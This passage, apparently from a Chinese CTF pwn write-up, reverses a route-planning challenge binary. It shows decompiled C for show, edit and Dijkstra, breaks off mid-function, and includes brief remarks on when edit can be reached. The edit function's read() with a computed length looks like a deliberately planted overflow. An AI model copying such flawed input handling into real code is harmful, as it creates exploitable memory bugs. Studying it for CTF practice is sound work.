punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token operator\">||</span> <span class=\"token punctuation\">(</span><span class=\"token function\">LODWORD</span><span class=\"token punctuation\">(</span>v0<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>routes<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> v4 <span class=\"token operator\">==</span> <span class=\"token punctuation\">(</span>_DWORD<span class=\"token punctuation\">)</span>v0<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token operator\">&amp;&amp;</span> <span class=\"token punctuation\">(</span><span class=\"token function\">LODWORD</span><span class=\"token punctuation\">(</span>v0<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>routes<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">4LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> city_name <span class=\"token operator\">==</span> <span class=\"token punctuation\">(</span>_DWORD<span class=\"token punctuation\">)</span>v0<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>      <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Distance:%d\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>routes<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">8LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token function\">LODWORD</span><span class=\"token punctuation\">(</span>v0<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Note:%s\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>routes<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">16LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>  <span class=\"token keyword\">return</span> v0<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>使用 printf 的 show 函数</p>\n<p><code>edit</code></p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">unsigned</span> __int64 <span class=\"token function\">edit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">int</span> v1<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+0h] [rbp-80h]</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">int</span> i<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+4h] [rbp-7Ch]</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">int</span> j<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+8h] [rbp-78h]</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token keyword\">int</span> city_name<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+Ch] [rbp-74h]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token keyword\">int</span> v5<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+10h] [rbp-70h]</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token keyword\">int</span> num<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+14h] [rbp-6Ch]</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  _DWORD <span class=\"token operator\">*</span>v7<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+18h] [rbp-68h]</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token keyword\">int</span> v8<span class=\"token punctuation\">[</span><span class=\"token number\">22</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+20h] [rbp-60h]</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> __int64 v9<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+78h] [rbp-8h]</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  v9 <span class=\"token operator\">=</span> <span class=\"token function\">__readfsqword</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x28u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  v1 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">!</span>edit_flag1 <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"You've already edited it!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">!</span>edit_flag2 <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"You don't need to edit anymore.\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"From where?\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>  city_name <span class=\"token operator\">=</span> <span class=\"token function\">get_city_name</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"To where?\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>  v5 <span class=\"token operator\">=</span> <span class=\"token function\">get_city_name</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>  <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">!=</span> <span class=\"token number\">20</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>i <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> routes<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>      <span class=\"token operator\">&amp;&amp;</span> <span class=\"token punctuation\">(</span>city_name <span class=\"token operator\">==</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>routes<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">&amp;&amp;</span> v5 <span class=\"token operator\">==</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>routes<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">4LL</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>       <span class=\"token operator\">||</span> v5 <span class=\"token operator\">==</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>routes<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">&amp;&amp;</span> city_name <span class=\"token operator\">==</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>routes<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">4LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>      v8<span class=\"token punctuation\">[</span>v1<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> i<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v1 <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"----------------\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span> j <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> j <span class=\"token operator\">&lt;</span> v1<span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>j <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>      <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[+] Route%d: %d\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span>j<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span>v8<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"----------------\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Which one do you want to change?\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    num <span class=\"token operator\">=</span> <span class=\"token function\">read_num</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> num <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span> <span class=\"token operator\">||</span> num <span class=\"token operator\">></span> v1 <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>      <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"How far?\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    v7 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>routes<span class=\"token punctuation\">[</span>v8<span class=\"token punctuation\">[</span>num<span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>    v7<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">read_num</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Note:\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>    <span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> v7 <span class=\"token operator\">+</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token number\">16</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>v7<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">79</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>  edit_flag1 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>  <span class=\"token keyword\">return</span> v9 <span class=\"token operator\">-</span> <span class=\"token function\">__readfsqword</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x28u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>edit 的进入有条件，需要 edit_flag2 置 1</p>\n<p><code>Dijkstra</code></p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">unsigned</span> __int64 <span class=\"token function\">Dijkstra</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">int</span> i<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+0h] [rbp-D0h]</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">int</span> j<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+4h] [rbp-CCh]</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">int</span> k<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+8h] [rbp-C8h]</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token keyword\">int</span> m<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+Ch] [rbp-C4h]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token keyword\">int</span> city_name<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+10h] [rbp-C0h]</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token keyword\">int</span> v6<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+14h] [rbp-BCh]</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token keyword\">int</span> v7<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+18h] [rbp-B8h]</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token keyword\">int</span> v8<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+1Ch] [rbp-B4h]</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token keyword\">int</span> v9<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+20h] [rbp-B0h] BYREF</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token keyword\">int</span> v10<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+40h] [rbp-90h] BYREF</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token keyword\">int</span> v11<span class=\"token punctuation\">[</span><span class=\"token number\">26</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+60h] [rbp-70h]</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> __int64 v12<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+C8h] [rbp-8h]</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  v12 <span class=\"token operator\">=</span> <span class=\"token function\">__readfsqword</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x28u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  v11<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>  v11<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">9999</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  v11<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">9999</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>  v11<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">9999</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>  v11<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">9999</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>  v11<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">9999</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>  v11<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>  v11<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">9999</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>  v11<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">9999</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>  v11<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">9999</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>  v11<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">9999</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>  v11<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">9999</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>  v11<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>  v11<span class=\"token punctuation\">[</span><span class=\"token number\">13</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">9999</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>  v11<span class=\"token punctuation\">[</span><span class=\"token number\">14</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">9999</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>  v11<span class=\"token punctuation\">[</span><span class=\"token number\">15</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">9999</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>  v11<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">9999</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>  v11<span class=\"token punctuation\">[</span><span class=\"token number\">17</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">9999</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>  v11<span class=\"token punctuation\">[</span><span class=\"token number\">18</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>  v11<span class=\"token punctuation\">[</span><span class=\"token number\">19</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">9999</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>  v11<span class=\"token punctuation\">[</span><span class=\"token number\">20</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">9999</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>  v11<span class=\"token punctuation\">[</span><span class=\"token number\">21</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">9999</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>  v11<span class=\"token punctuation\">[</span><span class=\"token number\">22</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">9999</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>  v11<span class=\"token punctuation\">[</span><span class=\"token number\">23</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">9999</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>  v11<span class=\"token punctuation\">[</span><span class=\"token number\">24</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>  <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">!=</span> <span class=\"token number\">20</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>i <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> routes<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>      v7 <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>routes<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>      v8 <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>routes<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">4LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>routes<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">8LL</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> v11<span class=\"token punctuation\">[</span><span class=\"token number\">5</span> <span class=\"token operator\">*</span> v7 <span class=\"token operator\">+</span> v8<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>      <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>        v11<span class=\"token punctuation\">[</span><span class=\"token number\">5</span> <span class=\"token operator\">*</span> v7 <span class=\"token operator\">+</span> v8<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>routes<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">8LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>        v11<span class=\"token punctuation\">[</span><span class=\"token number\">5</span> <span class=\"token operator\">*</span> v8 <span class=\"token operator\">+</span> v7<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_DWORD 